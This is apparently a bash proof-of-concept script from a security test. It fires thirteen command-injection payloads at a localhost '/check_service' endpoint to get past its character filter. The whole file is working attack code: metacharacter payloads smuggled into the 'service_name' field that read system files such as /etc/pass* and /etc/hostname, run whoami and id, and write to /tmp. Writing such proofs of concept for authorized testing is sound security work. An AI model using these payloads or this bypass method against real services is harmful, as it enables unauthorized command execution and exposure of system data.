#!/bin/bash

# POC: Filter Bypass Using Unfiltered Shell Operators
# Tests various shell metacharacters and techniques that bypass the character filter

TARGET="http://localhost:8080"
ENDPOINT="/check_service"

echo "=========================================="
echo "Filter Bypass - Unfiltered Operators POC"
echo "=========================================="
echo ""

# Function to test a payload
test_payload() {
    local name=$1
    local payload=$2
    echo "[*] Testing: $name"
    echo "    Payload: $payload"
    
    response=$(curl -s -X POST "$TARGET$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"service_name\": \"$payload\"}")
    
    http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"service_name\": \"$payload\"}")
    
    echo "    HTTP Status: $http_code"
    echo "    Response: $response"
    echo ""
}

# Test 1: Glob pattern exploitation (ls /etc/pass*)
echo "=== Test 1: Glob Pattern Exploitation ==="
test_payload "Glob Pattern" "-t custom ls /etc/pass*"

# Test 2: Brace expansion
echo "=== Test 2: Brace Expansion ==="
test_payload "Brace Expansion" "-t custom echo{a,b,c}"

# Test 3: Input redirection
echo "=== Test 3: Input Redirection ==="
test_payload "Input Redirection" "-t custom cat</etc/hostname"

# Test 4: Output redirection
echo "=== Test 4: Output Redirection ==="
test_payload "Output Redirection" "-t custom whoami>/tmp/poc_output.txt"

# Test 5: Append redirection
echo "=== Test 5: Append Redirection ==="
test_payload "Append Redirection" "-t custom id>>/tmp/poc_output.txt"

# Test 6: Stderr redirection
echo "=== Test 6: Stderr Redirection ==="
test_payload "Stderr Redirection" "-t custom whoami 2>/dev/null"

# Test 7: Null device redirection
echo "=== Test 7: Null Device Redirection ==="
test_payload "Null Device Redirection" "-t custom id>/dev/null"

# Test 8: Combining multiple operators
echo "=== Test 8: Complex Redirection Chain ==="
test_payload "Redirection Chain" "-t custom whoami>/tmp/test1.txt 2>/tmp/test2.txt"

# Test 9: Parentheses for grouping
echo "=== Test 9: Command Grouping with Parentheses ==="
test_payload "Parentheses Grouping" "-t custom (whoami;id)>/tmp/grouped.txt"

# Test 10: Null byte injection
echo "=== Test 10: Null Byte Injection ==="
test_payload "Null Byte %00" "-t custom id%00whoami"

# Test 11: Tilde expansion
echo "=== Test 11: Tilde Expansion ==="
test_payload "Tilde Expansion" "-t custom ls ~"

# Test 12: History expansion
echo "=== Test 12: History Expansion ==="
test_payload "History Expansion" "-t custom echo !'id'"

# Test 13: Bracket expression
echo "=== Test 13: Bracket Expression ==="
test_payload "Bracket Expression" "-t custom ls /etc/pass[a-z]*"

echo ""
echo "=========================================="
echo "POC Complete"
echo "=========================================="
echo ""
echo "Summary of results:"
echo "- All tests that return HTTP 200 demonstrate successful bypass"
echo "- Redirections create files in /tmp demonstrating command execution"
echo "- Glob patterns and brace expansion show unfiltered metacharacters"